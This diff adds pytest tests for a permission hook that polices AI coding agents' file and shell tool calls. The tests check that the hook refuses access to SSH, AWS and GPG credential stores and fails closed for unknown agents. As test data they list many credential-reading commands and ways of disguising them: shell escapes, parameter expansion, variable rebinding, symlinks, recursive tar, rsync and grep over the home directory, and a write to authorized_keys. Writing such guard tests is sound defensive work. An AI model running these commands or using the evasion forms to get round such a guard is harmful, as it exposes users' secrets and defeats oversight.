+def test_symlink_into_a_credential_store_is_refused(cred_home: Path) -> None:
+    (cred_home / ".ssh").mkdir()
+    (cred_home / "keys").symlink_to(cred_home / ".ssh")
+    path = str(cred_home / "keys" / "id_ed25519")
+    assert decide(_cred(None, "Read", file_path=path), CFG).reason == _refusal(path)
+    assert decide(_cred("repo-coder", "Read", file_path=path), CFG).reason == _refusal(path)
+
+
+@pytest.mark.parametrize("agent", [None, "repo-coder", "Explore"])
+@pytest.mark.parametrize("tool", ["Write", "Edit", "MultiEdit"])
+def test_write_into_a_credential_store_is_refused(
+    cred_home: Path, agent: str | None, tool: str
+) -> None:
+    for path, shown in (
+        (str(cred_home / ".ssh" / "authorized_keys"), cred_home / ".ssh" / "authorized_keys"),
+        ("~/.aws/credentials", cred_home / ".aws" / "credentials"),
+    ):
+        d = decide(_w(agent, path, tool), CFG)
+        assert not d.allow and d.reason == _refusal(str(shown)), (tool, path)
+
+
+def test_notebook_edit_into_a_credential_store_is_refused(cred_home: Path) -> None:
+    path = str(cred_home / ".gnupg" / "x.ipynb")
+    d = decide(_cred(None, "NotebookEdit", notebook_path=path), CFG)
+    assert not d.allow and d.reason == _refusal(path)
+
+
+def test_unknown_agent_reads_freely_outside_credentials(cred_home: Path, train_cwd: Path) -> None:
+    # 0023: Read, Glob and Grep carry only the credential deny, train or not.
+    for marked in (False, True):
+        if marked:
+            _mark(train_cwd)
+        cwd = str(train_cwd)
+        assert decide(_cred("Explore", "Read", cwd, file_path=f"{cwd}/src/a.py"), CFG).allow
+        assert decide(_cred("Explore", "Glob", cwd, pattern="**/*.py"), CFG).allow
+        assert decide(_cred("Explore", "Grep", cwd, pattern="def ", path=cwd), CFG).allow
+        key = str(cred_home / ".ssh" / "id_ed25519")
+        d = decide(_cred("Explore", "Read", cwd, file_path=key), CFG)
+        assert not d.allow and d.reason == _refusal(key)
+
+
+def test_unknown_agent_passes_through_without_a_train(train_cwd: Path) -> None:
+    cwd = str(train_cwd)
+    assert decide(_cred("Explore", "Bash", cwd, command="ls"), CFG).allow
+    assert decide(_cred("Explore", "Write", cwd, file_path=f"{cwd}/notes.md"), CFG).allow
+    assert decide(_cred("Explore", "WebFetch", cwd, url="https://example.com"), CFG).allow
+
+
+def test_unknown_agent_fails_closed_during_a_train(train_cwd: Path) -> None:
+    _mark(train_cwd)
+    cwd = str(train_cwd)
+    for payload in (
+        _cred("Explore", "Bash", cwd, command="ls"),
+        _cred("Explore", "Write", cwd, file_path=f"{cwd}/notes.md"),
+        _cred("otherplugin:repo-coder", "Bash", cwd, command="ls"),
+    ):
+        d = decide(payload, CFG)
+        assert not d.allow and "fail closed" in str(d.reason), payload
+
+
+def test_unknown_agent_without_an_absolute_cwd_fails_closed() -> None:
+    d = decide(_cred("Explore", "Bash", "", command="ls"), CFG)
+    assert not d.allow and "no absolute cwd" in str(d.reason)
+
+
+@pytest.mark.parametrize("marked", [False, True])
+def test_daedalus_agents_are_policed_with_or_without_a_train(train_cwd: Path, marked: bool) -> None:
+    if marked:
+        _mark(train_cwd)
+    cwd = str(train_cwd)
+    assert decide(_cred("daedalus:repo-coder", "Bash", cwd, command="pytest -q"), CFG).allow
+    d = decide(_cred("daedalus:repo-coder", "Bash", cwd, command="git push origin x"), CFG)
+    assert not d.allow
+    d = decide(_cred("daedalus:mystery", "Bash", cwd, command="ls"), CFG)
+    assert not d.allow and "fail closed" in str(d.reason)
+
+
+@pytest.mark.parametrize("agent", CREDENTIAL_AGENTS)
+def test_grep_rooted_at_home_or_an_ancestor_is_refused(cred_home: Path, agent: str | None) -> None:
+    # spec 8: the Grep tool passes --hidden, so a search rooted above a store reads it.
+    for payload in (
+        _cred(agent, "Grep", pattern="BEGIN", path=str(cred_home)),
+        _cred(agent, "Grep", str(cred_home), pattern="BEGIN"),
+        _cred(agent, "Grep", str(cred_home / ".ssh"), pattern="BEGIN"),
+        _cred(agent, "Grep", pattern="BEGIN", path="/"),
+        _cred(agent, "Grep", pattern="BEGIN", path="~", glob="*.pub", type="py"),
+    ):
+        d = decide(payload, CFG)
+        assert not d.allow and "credential path" in str(d.reason), payload
+    ok = _cred(agent, "Grep", pattern="BEGIN", path=str(cred_home / "project"))
+    assert decide(ok, CFG).allow
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "grep -r '' {home}",
+        "rg -uu BEGIN {parent}",
+        "rg --hidden BEGIN ~",
+        "tar cf - {home}",
+        "cp -r ~ /tmp/x",
+        "find ~ -name id_ed25519 -exec cat {{}} +",
+        "zip -r /tmp/x.zip ~",
+        "rsync -a ~ /tmp/x",
+        "grep -R BEGIN ~/.config",
+        "cd ~ && grep -r BEGIN .",
+    ],
+)
+def test_recursive_reader_over_a_store_ancestor_is_refused(
+    cred_home: Path, agent: str | None, command: str
+) -> None:
+    text = command.format(home=cred_home, parent=cred_home.parent)
+    d = decide(_cred(agent, "Bash", str(cred_home / "project"), command=text), CFG)
+    assert not d.allow and "credential path" in str(d.reason), text
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_recursive_reader_away_from_stores_is_allowed(cred_home: Path, agent: str | None) -> None:
+    cwd = str(cred_home / "project")
+    for command in (
+        f"grep -r '' {cred_home}/project",
+        f"tar cf - {cred_home}/project/src",
+        "du -sh ~",
+        f"cp {cred_home}/a.txt /tmp/x",
+    ):
+        assert decide(_cred(agent, "Bash", cwd, command=command), CFG).allow, command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        r"cat ~/.s\sh/id",
+        r"cat ~/.ssh\/id",
+        r"cat $HOME/.s\sh/id",
+        "cat ${HOME:-x}/.ssh/id",
+        "cat ${HOME%/}/.ssh/id",
+        "D=~/.ss; cat ${D}h/id",
+        "D=~/.ss; cat $D''h/id",
+        "cat ${UNSET_THING}/id",
+    ],
+)
+def test_escape_and_parameter_forms_are_refused(
+    cred_home: Path, agent: str | None, command: str
+) -> None:
+    d = decide(_b(agent, command), CFG)
+    assert not d.allow and "credential path" in str(d.reason), command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_quoted_home_project_path_is_allowed(cred_home: Path, agent: str | None) -> None:
+    assert decide(_b(agent, 'cat "$HOME/project/x"'), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["cd -P ~ && cat .ssh/id", "cd -L ~ && cat .ssh/id", "cd -- ~ && cat .ssh/id"],
+)
+def test_cd_options_do_not_hide_the_target(cred_home: Path, command: str) -> None:
+    d = decide(_b(None, command), CFG)
+    assert not d.allow and "credential path" in str(d.reason), command
+
+
+def test_refusal_names_the_resolved_target(cred_home: Path) -> None:
+    d = decide(_b(None, "cd ~/.ssh && cat id_ed25519"), CFG)
+    assert d.reason == _refusal(str(cred_home / ".ssh"))
+    d = decide(_b(None, "cd ~/.aws; cat credentials"), CFG)
+    assert d.reason == _refusal(str(cred_home / ".aws"))
+
+
+def test_unknown_agent_never_writes_the_data_dir(train_cwd: Path) -> None:
+    # 0010: the data dir is Daedalus's own integrity, refused train or not.
+    cwd = str(train_cwd)
+    data = f"{cwd}/.claude/daedalus"
+    for payload in (
+        _cred("Explore", "Write", cwd, file_path=f"{data}/x"),
+        _cred("Explore", "Edit", cwd, file_path=f"{data}/config.json"),
+        _cred("Explore", "Bash", cwd, command=f"tee {data}/train.active"),
+        _cred("Explore", "Bash", cwd, command=f"rm {data}/train.active"),
+    ):
+        d = decide(payload, CFG)
+        assert not d.allow and "data" in str(d.reason), payload
+
+
+def test_unknown_agent_dotgit_write_is_refused_only_during_a_train(train_cwd: Path) -> None:
+    cwd = str(train_cwd)
+    payload = _cred("Explore", "Write", cwd, file_path=f"{cwd}/.git/hooks/pre-commit")
+    assert decide(payload, CFG).allow
+    _mark(train_cwd)
+    assert not decide(payload, CFG).allow
+
+
+@pytest.fixture
+def plain_repo(tmp_path: Path) -> Path:
+    root = tmp_path.resolve() / "repo"
+    (root / "src").mkdir(parents=True)
+    (root / ".github").mkdir()
+    (root / "src" / "a.py").write_text("x\n")
+    return root
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "for d in ~; do cat $d/.ssh/id; done",
+        "read d; cat $d/.ssh/id",
+        "while read d; do cat ${d}/.aws/config; done",
+        "cat $DAEDALUS_UNSET_PROBE/.ssh/id",
+        "read d; echo x > $d/.ssh/authorized_keys",
+        "read d; cd $d && cat .ssh/id",
+    ],
+)
+def test_unresolved_variable_in_a_path_position_is_refused(
+    cred_home: Path, plain_repo: Path, agent: str | None, command: str
+) -> None:
+    # spec 8: $name and ${name} alike; read binds nothing the jail can resolve.
+    d = decide(_cred(agent, "Bash", str(plain_repo), command=command), CFG)
+    assert not d.allow and "credential path" in str(d.reason), command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "for f in *; do echo ${f}; done",
+        "for f in *; do cat ${f}; done",
+        "awk '{print ${1}}' f",
+        "git log --format=${x}",
+        "grep -rn '${{ secrets' {repo}/.github",
+        "echo $DAEDALUS_UNSET_PROBE",
+    ],
+)
+def test_variables_outside_path_positions_are_allowed(
+    cred_home: Path, plain_repo: Path, agent: str | None, command: str
+) -> None:
+    text = command.replace("{repo}", str(plain_repo))
+    d = decide(_cred(agent, "Bash", str(plain_repo), command=text), CFG)
+    assert d.allow, (text, d.reason)
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_rg_refusal_follows_hidden_components(
+    cred_home: Path, plain_repo: Path, agent: str | None
+) -> None:
+    # spec 8: rg skips hidden dirs by default, so only a non-hidden path reaches a store.
+    cwd = str(plain_repo)
+    for command in ("rg BEGIN ~/.config", "rg -uu BEGIN ~", "rg -. BEGIN ~", "rg --hidden x ~"):
+        d = decide(_cred(agent, "Bash", cwd, command=command), CFG)
+        assert not d.allow and "credential path" in str(d.reason), command
+    for command in ("rg BEGIN ~", f"rg BEGIN {plain_repo}", "rg BEGIN"):
+        assert decide(_cred(agent, "Bash", cwd, command=command), CFG).allow, command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_patterns_and_find_predicates_are_not_paths(
+    cred_home: Path, plain_repo: Path, agent: str | None
+) -> None:
+    cwd = str(plain_repo)
+    for command in (
+        "grep -rn / src",
+        "grep -r ~ src",
+        r"grep -rn '\.\./\.\.' src",
+        "rg -n / src",
+        "grep -r -e / src",
+        f"find {cwd}/src -path ~ -prune -o -name x -exec ls {{}} +",
+    ):
+        d = decide(_cred(agent, "Bash", cwd, command=command), CFG)
+        assert d.allow, (command, d.reason)
+    for command in ("grep -r '' ~", "grep -r -e x ~", "grep -rf pats ~"):
+        d = decide(_cred(agent, "Bash", cwd, command=command), CFG)
+        assert not d.allow and "credential path" in str(d.reason), command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_wrapper_option_values_are_consumed(
+    cred_home: Path, plain_repo: Path, agent: str | None
+) -> None:
+    cwd = str(plain_repo)
+    for command in ("sudo -u root tar cf - ~", "nice -n 5 tar cf - ~", "env -u X tar cf - ~"):
+        d = decide(_cred(agent, "Bash", cwd, command=command), CFG)
+        assert not d.allow and "credential path" in str(d.reason), command
+    assert decide(_cred(agent, "Bash", cwd, command=f"sudo tar cf - {cwd}/src"), CFG).allow
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "for d in ~; do cat $d/.ssh/id_ed25519; done; for d in /tmp; do :; done",
+        "D=~; cat $D/.ssh/id_ed25519; D=/tmp",
+        "D=/tmp; for i in 1 2; do cat $D/.ssh/id_ed25519; D=~; done",
+        "while true; do cat $D/.aws/config; D=~; done",
+    ],
+)
+def test_a_later_binding_does_not_hide_an_earlier_read(
+    cred_home: Path, plain_repo: Path, agent: str | None, command: str
+) -> None:
+    # spec 8: bindings apply in segment order; a loop body sees every binding inside the loop.
+    d = decide(_cred(agent, "Bash", str(plain_repo), command=command), CFG)
+    assert not d.allow and "credential path" in str(d.reason), command
+
+
+@pytest.mark.parametrize("agent", [None, "Explore"])
+def test_a_later_binding_does_not_taint_an_earlier_read(
+    cred_home: Path, plain_repo: Path, agent: str | None
+) -> None:
+    cwd = str(plain_repo)
+    for command in ("D=/tmp; cat $D/x; D=~", "for f in *; do cat ${f}; done"):
+        d = decide(_cred(agent, "Bash", cwd, command=command), CFG)
+        assert d.allow, (command, d.reason)
